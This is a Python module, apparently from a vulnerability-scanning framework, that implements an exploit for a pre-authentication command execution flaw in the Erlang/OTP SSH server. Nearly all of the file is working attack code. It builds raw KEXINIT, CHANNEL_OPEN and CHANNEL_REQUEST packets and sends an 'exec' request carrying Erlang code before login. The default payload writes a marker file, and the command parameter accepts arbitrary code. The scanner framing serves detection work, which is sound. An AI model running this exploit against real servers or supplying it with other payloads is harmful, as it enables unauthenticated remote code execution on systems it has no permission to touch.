"""Agent Asteroid implementation for CVE-2024-24938"""

import datetime
import logging
import socket
import struct
import time

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE: str = "Erlang/OTP SSH Pre-Auth Command Execution"
VULNERABILITY_REFERENCE: str = "CVE-2024-24938"
VULNERABILITY_DESCRIPTION: str = """
A critical vulnerability in Erlang/OTP SSH server allows unauthenticated attackers
 to execute arbitrary Erlang code by sending specially crafted SSH channel messages
 before authentication is completed.
"""
RISK_RATING: str = "CRITICAL"
DEFAULT_TIMEOUT: datetime.timedelta = datetime.timedelta(seconds=10)
DEFAULT_SSH_PORT: int = 2222

# SSH protocol constants
SSH_CLIENT_BANNER: bytes = b"SSH-2.0-OpenSSH_8.9\r\n"
ERLANG_SSH_BANNER_PATTERN: bytes = b"SSH-2.0-Erlang"
SSH_MSG_KEXINIT: bytes = b"\x14"
SSH_MSG_CHANNEL_OPEN: bytes = b"\x5a"
SSH_MSG_CHANNEL_REQUEST: bytes = b"\x62"

# Default payload
DEFAULT_EXPLOIT_COMMAND: str = 'file:write_file("/tmp/exploit_success", <<"pwned">>).'


def string_payload(s: str) -> bytes:
    """Helper to format SSH string: 4-byte length prefix and UTF-8 bytes."""
    s_bytes: bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes


def build_channel_open(channel_id: int = 0) -> bytes:
    """Builds an SSH_MSG_CHANNEL_OPEN packet for the given session ID."""
    return (
            SSH_MSG_CHANNEL_OPEN
            + string_payload("session")
            + struct.pack(">I", channel_id)  # sender channel ID
            + struct.pack(">I", 0x68000)  # initial window size
            + struct.pack(">I", 0x10000)  # max packet size
    )


def build_channel_request(channel_id: int = 0, command: str | None = None) -> bytes:
    """Builds an SSH_MSG_CHANNEL_REQUEST packet with an 'exec' request."""
    if command is None:
        command = DEFAULT_EXPLOIT_COMMAND

    return (
            SSH_MSG_CHANNEL_REQUEST
            + struct.pack(">I", channel_id)
            + string_payload("exec")
            + b"\x01"  # want_reply = true
            + string_payload(command)
    )


def build_kexinit() -> bytes:
    """Constructs a minimal, valid SSH_MSG_KEXINIT packet."""
    cookie: bytes = b"\x00" * 16

    def name_list(names: list[str]) -> bytes:
        """Pack a comma-separated algorithm list as an SSH name-list."""
        return string_payload(",".join(names))

    return (
            SSH_MSG_KEXINIT
            + cookie
            + name_list(
        [
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group-exchange-sha256",
            "diffie-hellman-group14-sha256",
        ]
    )
            + name_list(["rsa-sha2-256", "rsa-sha2-512"])  # host key algorithms
            + name_list(["aes128-ctr"]) * 2  # encryption client->server, server->client
            + name_list(["hmac-sha1"]) * 2  # MAC algorithms
            + name_list(["none"]) * 2  # compression algorithms
            + name_list([]) * 2  # languages
            + b"\x00"
            + struct.pack(">I", 0)  # first_kex_packet_follows + reserved
    )


def pad_packet(payload: bytes, block_size: int = 8) -> bytes:
    """Pads the given SSH packet payload to align with the specified block size."""
    min_padding: int = 4
    padding_len: int = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size

    packet_length: int = len(payload) + 1 + padding_len
    return (
            struct.pack(">I", packet_length)
            + bytes([padding_len])
            + payload
            + bytes([0] * padding_len)
    )


@exploits_registry.register
class ErlangSSHPreAuthExploit(webexploit.WebExploit):
    """
    CVE-2024-24938: Erlang/OTP SSH Pre-Auth Command Execution

    Exploits a vulnerability in Erlang/OTP SSH server that allows sending channel
    messages before authentication, enabling arbitrary Erlang code execution.
    """

    metadata: definitions.VulnerabilityMetadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Determine whether the given target is running an Erlang SSH server.

        :param target: definitions.Target containing host and optional port.
        :return: True if the SSH banner indicates Erlang OTP, False otherwise.
        """
        try:
            s: socket.SocketType = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            logging.info("Socket object created successfully: %s", s)

            host: str = target.host
            port: int = target.port or DEFAULT_SSH_PORT
            timeout_seconds: int = DEFAULT_TIMEOUT.seconds

            s.settimeout(timeout_seconds)

            try:
                s.connect((host, port))
                logging.info("Connection established successfully")
            except socket.error as connect_err:
                logging.error("Socket connect error: %s", connect_err)
                s.close()
                return False

            logging.info("Sending SSH client banner")
            s.sendall(SSH_CLIENT_BANNER)

            banner: bytes = s.recv(1024)
            logging.info(
                "Received banner: %s",
                banner.strip().decode(errors="ignore"),
            )

            is_erlang: bool = ERLANG_SSH_BANNER_PATTERN in banner
            logging.info(
                "%s identified as Erlang SSH server",
                "Target" if is_erlang else "Target not",
            )

            s.close()
            return is_erlang

        except socket.error as e:
            logging.error("Socket error: %s", e)
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Check whether the Erlang SSH server is vulnerable by sending exploit packets.

        :param target: definitions.Target containing host and optional port.
        :return: List of found definitions.Vulnerability instances (empty if none).
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        logging.info(
            "Starting vulnerability check for target: %s:%s",
            target.host,
            target.port or DEFAULT_SSH_PORT,
        )

        try:
            s: socket.SocketType = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            host: str = target.host
            port: int = target.port or DEFAULT_SSH_PORT
            timeout_seconds: int = DEFAULT_TIMEOUT.seconds
            s.settimeout(timeout_seconds)

            try:
                s.connect((host, port))
            except socket.error as connect_err:
                logging.error(
                    "Connection error during vulnerability check: %s", connect_err
                )
                s.close()
                return vulnerabilities

            # 1. Banner exchange
            logging.info("Sending SSH client banner")
            s.sendall(SSH_CLIENT_BANNER)
            banner: bytes = s.recv(1024)
            logging.info(
                "Received banner: %s",
                banner.strip().decode(errors="ignore"),
            )

            time.sleep(0.5)

            # 2. Send SSH_MSG_KEXINIT
            logging.info("Building and sending SSH_MSG_KEXINIT packet")
            kex_packet: bytes = build_kexinit()
            padded_kex: bytes = pad_packet(kex_packet)
            logging.debug("KEXINIT packet (hex): %s", padded_kex.hex())
            s.sendall(padded_kex)

            time.sleep(0.5)

            # 3. Send SSH_MSG_CHANNEL_OPEN
            logging.info("Building and sending SSH_MSG_CHANNEL_OPEN packet")
            chan_open: bytes = build_channel_open()
            padded_open: bytes = pad_packet(chan_open)
            logging.debug("CHANNEL_OPEN packet (hex): %s", padded_open.hex())
            s.sendall(padded_open)

            time.sleep(0.5)

            # 4. Send SSH_MSG_CHANNEL_REQUEST with exploit command
            logging.info(
                "Building and sending SSH_MSG_CHANNEL_REQUEST packet with command: %s",
                DEFAULT_EXPLOIT_COMMAND,
            )
            chan_req: bytes = build_channel_request(command=DEFAULT_EXPLOIT_COMMAND)
            padded_req: bytes = pad_packet(chan_req)
            logging.debug("CHANNEL_REQUEST packet (hex): %s", padded_req.hex())
            s.sendall(padded_req)

            try:
                response: bytes = s.recv(1024)
                if response:
                    logging.info(
                        "Received response from server (hex): %s", response.hex()
                    )
                    vuln = self.create_vulnerability(target)
                    vulnerabilities.append(vuln)
                else:
                    logging.info("Empty response received from server")
            except socket.timeout:
                logging.info("Socket timeout waiting for response")

        except socket.error as e:
            logging.error("Socket error during vulnerability check: %s", e)

        return vulnerabilities
